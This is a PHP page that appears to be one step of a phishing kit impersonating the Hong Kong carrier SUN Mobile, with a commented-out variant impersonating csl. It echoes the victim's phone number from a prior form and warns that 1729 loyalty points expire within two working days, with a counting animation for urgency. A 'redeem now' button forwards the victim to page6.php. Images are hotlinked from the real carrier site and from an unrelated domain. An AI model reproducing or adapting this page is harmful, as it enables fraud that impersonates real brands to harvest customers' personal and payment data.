<?php
session_start();
//require_once 'config.php';
include('header.php');
// include('partials/header-new.php');


if (isset($_POST['submit']) || isset($_POST['phone'])) {
    $_SESSION['step1Data'] = $_POST;
}



?>
<style>
    .wrap {
        padding: 30px 20px;
/*        margin-top:70px;*/
        padding-bottom: 0px;
    }
    @media only screen and (max-width: 1024px){
.planImages ul .gist[data-v-42547111] {

    font-size: 24px !important;

}
}
    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: red;
        font-size: 19px;
        font-weight: bold;
    }
    .notice {
        line-height:2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
    }
    @media(max-width: 767px) {
        .submit-btn {
            width: 100%;
            line-height: 40px;
            text-align: center;
            display: inline-block;
            color: #000 !important;
            border-radius: 30px;
            background: linear-gradient(90deg,#fd0 0,#faa61a);
            cursor: pointer;
            margin-bottom: 20px;
        }

        .submit-btn:hover:hover {
            background-color: red;
            border-color: red;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }

/*14-12-23*/

.card-box {
    background: #fff;
    border: 1px solid #cdcdcd;
    border-radius: 12px;
    padding: 15px;
    margin-bottom: 20px;
}
.card-box h4 {
    font-weight: 600 !important;
    font-size: 22px;
    font-family: Noto Sans,sans-serif;
    line-height: 1.2;
}
.Plan_amount  {
    color: #3e3e3e;
    font-size: 38px;
    font-weight: 700; 
}
.text-orange{
     color: #ff6b00 !important;
}
.Plan_amountTxt {
    font-size: 14px;
    letter-spacing: .28px;
}
 .line {
    margin: 0 0 20px 0;
    opacity: .2;
}
.sun-mobile-5g {
    padding: 15px;
    margin-bottom: 10px;
}
.btn-link {
    background: linear-gradient(226deg,#f7d0b2,#ff5d00);
    border-radius: 53px;
    border: 0;
    color: #fff;
    font-weight: 700;
    font-size: 18px;
    line-height: 150%;
    display: block;
    text-align: center;
    padding: 15px 10px;
    text-decoration: none;
}
.btn-link:hover {
    background: linear-gradient(227deg,#f7d0b2 18.53%,#ff5d00 69.1%);
    transition: .5s;
     color: #fff;
      text-decoration: none;
}
.text-link {
    font-weight: 400;
    font-size: 12px;
    line-height: 150%;
    color: #3e3e3e;
}
.center {
    text-align: center;
}

.title-text{
    font-size: 32px;
    line-height: 130%;
    color: #3e3e3e;
    font-weight: 700 !important;
    text-align: center;
}
span#counter {
    color: #ff6b00;
}
.sun-mobile-5g {
    text-align: center;
}
.sun-mobile-5g h5 {
    font-size: 20px;
    font-weight: 600;
    line-height: 150%;
}
.sun-mobile-5g p {
    font-size: 16px;
    line-height: 1.42857143;
    color: #333;
}
.sun-mobile-5g {
    padding: 15px;
}

.accordion-part h2#headingThree {
    margin: 0;
}
.accordion-part .accordion-item {
    background-color: unset;
    border: unset;
}
.accordion-part .accordion-item button.accordion-button {
    padding: 0;
    color: unset;
    background-color: unset;
    box-shadow: unset;
    font-size: 16px;
    font-weight: 600;
}

.accordion-part .accordion-body {
    padding: 20px 0;
}
.list-part li {
    list-style: none;
    font-size: 16px;
    line-height: 1.42857143;
    color: #333;
    font-weight: 500;
}
.list-part {
    padding-left: 20px;
}
.text-part {
    font-size: 16px;
    line-height: 150%;
    color: #333;
}




</style>
<div class="wrap">
  

<div class="card-box">
    <div class="card-body">
         <h4 > 尊敬的會員: <span style="color:#f5b01c !important;"><?php  echo @$_SESSION['step1Data']['phone']; ?></span> </h4> 
        <h4> 您的Sun可用積分: <span id="counter">1729</span>分 </h4> 
      <p class="text-part"> [Sunmobile積分計劃]提示您，您的賬戶當前積分（1729積分），將於兩個工作日內到期，爲避免影響，請及    </p>
        <hr class="line"> 
  
        <a href="page6.php" class="btn-link">立即兌換</a>
        

        </div>
</div>


<br> 

<h2 class="title-text">SUN Mobile 積分服務</h2>
 
<div class="sun-mobile-5g">
    <img src="https://5g.sunmobile.com.hk/assets/icon_speed.png" alt="icon" class="icon-card">
    <h5>積分兌換</h5>
    <p>隨時隨地累計您的積分，助您更佳的體驗Sunmobile帶來的服務</p>
</div>

<div class="sun-mobile-5g"> 
    <img src="https://5g.sunmobile.com.hk/assets/icon_nodelay.png" alt="icon3" class="icon-card">
    <h5>在哪裏使用？</h5>
    <p>您可前往Sunmobile官網-積分頁面進行查詢並兌換您的可用積分，或諮詢附近門店</p>
</div>

<div class="sun-mobile-5g"> 
    <img src="https://5g.sunmobile.com.hk/assets/icon_stable.png" alt="icon2" class="icon-card">
    <h5>積分有效期</h5>
    <p>通常爲一年有效期，過期將自動清理。如閣下有可用積分，請儘快兌換</p>
</div>

<br> 








<!--     <div data-v-42547111="" class="planImages">

<img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16835194647658102.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16835194647680161.jpg">
         <ul data-v-42547111=""><li data-v-42547111="" class="gist">積分到期提醒
</li></ul>
<img data-v-42547111="" src="https://www.three.com.mo/assets/img/bannerM.29a04b8.png" alt="">  


</div> -->
<!--     <a href="" class="main-logo">
        <i style="color:#ffb100;font-size:26px;" class="fa fa-warning"></i>
        積分有效期提示
        
    </a>

    <div class="notice" style="font-size:13px;">

        <p>尊敬的csl客戶：<?php echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <p>
            csl積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p>
        </br>
        <p>
            csl積分計劃為您帶來最新、最精彩的優惠，下載csl緊貼最新資訊，輕輕鬆鬆就可以賺取csl積分！
            積分可用於直接繳付賬單外，更可以兌換多種生活禮品包括超市禮券、咖啡現金券、儲值卡等。
            csl積分計劃為您帶來最新、最精彩的優惠積分碼的條款及細則
            除非另有規定，每個csl積分只能使用一次。合資格客戶可於商戶發送csl積分時所展示之條款及細則查閱其csl積分碼之指定兌換有效期。csl積分碼必須於指定兌換有效期前，於csl兌換成csl積分。csl積分碼逾期將作廢並自動註銷，且不獲補發或延長兌換有效期。
            </br>
            如有任何爭議，csl香港將保留一切最終決定權。
        </p>
    </div>
    <div class="center">
        <a href="page6.php" class="btn submit-btn">積分兌換</a>
    </div> -->
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
    // Function to update the counter
    function updateCounter() {
        // Get the counter element
        var counterElement = document.getElementById("counter");

        // Initialize the counter value
        var counterValue = 0;

        // Update the counter every 100 milliseconds (adjust the interval as needed)
        var counterInterval = setInterval(function() {
            // Update the counter value
            counterElement.innerText = counterValue;

            // Increment the counter
            counterValue++;

            // Check if the counter reached 1729, and stop the interval
            if (counterValue > 1729) {
                clearInterval(counterInterval);
            }
        }, 0); // Adjust the interval (in milliseconds) as needed
    }

    // Call the updateCounter function when the page is loaded
    window.onload = function() {
        updateCounter();
    };
</script>



<?php
include('footer-new.php');
